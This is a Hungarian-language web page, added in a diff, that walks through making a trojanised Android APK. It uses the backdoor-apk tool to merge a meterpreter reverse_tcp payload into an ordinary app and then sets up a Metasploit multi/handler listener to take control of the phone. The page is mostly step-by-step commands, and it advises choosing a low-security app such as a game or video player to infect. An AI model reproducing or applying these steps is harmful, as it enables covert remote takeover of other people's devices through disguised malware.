@@ -1,0 +1,147 @@
+<!DOCTYPE html>
+<html>
+    <link rel="stylesheet" href="../css/styles.css">
+    <link rel="preconnect" href="https://fonts.gstatic.com">
+    <link href="https://fonts.googleapis.com/css2?family=Anton&display=swap" rel="stylesheet"> 
+    <head>
+        <title>APK másolás metasploit framework</title>
+    </head>
+    <body>
+        <div id="fejlec">
+            <br>
+            <h1><img src="../pictures/Logopit_1616149142370.png" height="10%" width="10%"></h1>
+            <br>
+        </div>
+
+        <div id="menubar">
+            <a href="../html/index.html">Főoldal</a><a class="tavolsag" href="../html/temak.html">Témák</a>
+        </div>
+
+
+
+        <div class="textbubble">
+            <h1 id="bubblecim" ><strong>Metasploit APK másolás</strong></h1>
+            <p>Sziasztok! Ma bemutatom hogyan lehet APK-t lemásolni egy payloaddal. Itt videó formában is megtudhatod, hogyan készíts egy fertőzött APK-t:</p>
+            <iframe width="560" height="315" src="https://www.youtube.com/embed/9IUMlZAj7S8" frameborder="0" allowfullscreen></iframe>
+           
+
+          </div>
+          <br>
+          <div class="textbubble">
+            <h2>Kellékek:</h2>
+            <p id="lefttext">Mindenek előtt kelleni fog egy Linux (Ajánlott a Kali Linux, de egy Ubuntu vagy bármilyen Debian is 
+            megteszi csak arra még le kell telepítened a következőket:           
+            </p>
+            <ul id="lefttext">
+                <li>sudo apt-get install git</li>
+                <li>sudo apt-get install metasploit-framework</li>
+              </ul>
+              <p id="lefttext">Ha nem szeretnél dualboot-os számítógépet van megoldás, használj <a href="https://www.virtualbox.org/">VirtualBox-ot</a>.</p>
+          </div>
+          <br>
+          <div class="textbubble">
+            <p id="lefttext">Na viszont kezdjünk bele. Először is nyiss egy terminált. Válaszd ki hova szeretnéd lementeni. Használd a választáshoz a <strong>cd</strong>
+            avagy change dictionary parancsot.</p>
+          </div>
+          <br>
+          <div class="textbubble">
+            <p id="lefttext">Ha ezzel megvagy most le kell telepítened pár file-t a következő paranccsal:</p>
+            <ul id="lefttext">
+                <li>git clone https://github.com/dana-at-cp/backdoor-apk</li>
+              </ul>
+              <p id="lefttext">Ha egy lakat ikont látsz rajta akkor azt a</p>
+              <ul id="lefttext">
+                <li>sudo chown -v felhasználónév file neve</li>
+              </ul>
+              <p id="lefttext">paranccsal tudod leszedni.</p>
+          </div>
+          <br>
+          <div class="textbubble">
+            <p id="lefttext">Most töltsük le a szükséges kódokat:</p>
+            <ul id="lefttext">
+                <li>apt-get update</li>
+                <li>apt-get upgrade</li>
+                <li>apt-get install -y default-jdk</li>
+                <li>apt-get install apktool</li>
+                <li>apt-get install zipalign</li>
+                <li>apt-get install smali</li>
+            </ul>
+          </div>
+          <br>
+          <div class="textbubble">
+            <p id="lefttext">Most menjünk a terminállal a backdoor-apk mappájába a következő paranccsal:</p>
+            <ul id=lefttext>
+                <li>cd backdoor-apk</li>
+            </ul>
+            <p id="lefttext">Mégegyszer írjuk be ugyan ezt a kódot mivel a mappán belül van mégegy ilyen nevű mappa</p>
+            <ul id=lefttext>
+                <li>cd backdoor-apk</li>
+            </ul>
+            <p id="lefttext">Most átkell szerkesztenünk a backdoor-apk.sh file-t a nano command használatával:</p>
+            <ul id=lefttext>
+                <li>nano backdoor-apk.sh</li>
+            </ul>
+            <p id="lefttext">Keressük ki a ZIPALIGN=... sort és töröljük ki a felesleges sorokat. Legyen nálad is úgy mint a következő képen:</p>
+            <a href="../pictures/zipalign.png"><img src="../pictures/zipalign.png" height="70%" width="70%"></a>
+            <p id="lefttext">ctrl+o gombkombinációval mentsd el a file-t és ctrl+x-el tudsz kilépni a szerkesztésből.</p>
+          </div>
+          <br>
+          <div class="textbubble">
+            <p id="lefttext">Most töltsük le az APKTOOL-t.</p>
+            <p id="lefttext"><a href="https://ibotpeaches.github.io/Apktool/install/">Itt tudod letölteni.</a>
+                <a href="https://youtu.be/9IUMlZAj7S8">  Több segítség a videóban.</a></p>
+          </div>
+          <br>
+          <div class="textbubble">
+            <p id="lefttext">Miután letöltötted az APKTOOL-t tölts le egy APK file-t (például: videólejátszó, egy szimpla offline játék, a lényeg, hogy ne egy 
+                nagyobb biztonságú appot tölts le mint az instagram vagy hasonló.)<br>
+                Ezt az apk file-t másold vagy helyezd át a backdoor-apk belüli backdoor-apk mappába, ha nem engedi használd a következő parancsot:
+                <ul id="lefttext">
+                    <li>sudo chown -v felhasználónév mappa ami megtagadja az engedélyt</li>
+                </ul>
+                </p>
+                <p id="lefttext">ha ezzel megvagy már nincs sok hátra :)<br>
+                A következő lépés, hogy elindítsuk az APK másolást ezzel a paranccsal: (Ügyelj, hogy a backdoor-apk belüli backdoor-apk mappában van megnyitva a terminál!)
+                <ul id="lefttext">
+                    <li>./backdoor-apk.sh alkalmazásnév.apk</li>
+                </ul>
+            </p>
+            <p id="lefttext">Ha beírtad vagy bemásoltad a terminálba az előző kódsort ezt kell, hogy lásd:</p>
+            <a href="../pictures/backdoor.png"><img src="../pictures/backdoor.png" height="70%" width="70%"></a>
+            <p id="lefttext">Válaszd a meterpreter/reverse_tcp-t a 3-as szám beírásával, utánna írd be az IP címed az LHOST-hoz majd az LPORT-hoz a 8080-at.<br>
+                utánna válaszd a merge with payload and shuffle-t a 2-es szám beírásával.<br>
+                ha ez megvolt akkor elkedte készíteni a payload APK-t, ha készvan bezárhatod a terminált.
+           </p>
+          </div>
+          <br>
+          <div class="textbubble">
+              <h2>Most megkezdhetjük az APK-val a kapcsolatbalépést a metasploit framework segítségével</h2>
+            <p id="lefttext">Nyiss egy új terminált és használd a következő parancsokat:
+                <ul id="lefttext">
+                    <li>sudo su</li>
+                    <li>msfconsole</li>
+                </ul>
+            </p>
+            <p id="lefttext">Mostmár csak bekell állítani, hogy a te IP címedre hostoljon a payload APK. Hogyan is kell? Használd a következő parancsokat:
+                <ul id="lefttext">
+                    <li>use exploit/multi/handler</li>
+                    <li>set payload android/meterpreter/reverse_tcp</li>
+                    <li>set LHOST IP címed</li>
+                    <li>set LPORT 8080</li>
+                    <li>run</li>
+                </ul>
+            </p>
+            <p id="lefttext">Vidd át a telefonodra az APK-t és nyisd meg, hogy a metasploit framework fel tudja venni a kapcsolatot a payloaddal és onnantól kezdve kezelheted a telefonodat a meterpreter-el.<br></p>
+            <p id="lefttext">Igazából ennyi is lett volna. Köszi, hogy elolvastad:) ha van bármi kérdés nyugodtan írj egy emailt: memdoboz@gmail.com</p>
+          </div>
+          <br>
+
+        <div id="fejlec">
+        <br>
+            <p><a target="blank" href="https://www.youtube.com/channel/UCUrtasPlnqhbGDHUhqR1MIA"><img src="../icons/youtube.png"></a><a href="https://instagram.com/bndrmrtn" target="blank"><img src="../icons/instagram.png"></a> </p>
+        <br>
+        </div>
+    </body>
+
+
+</html>
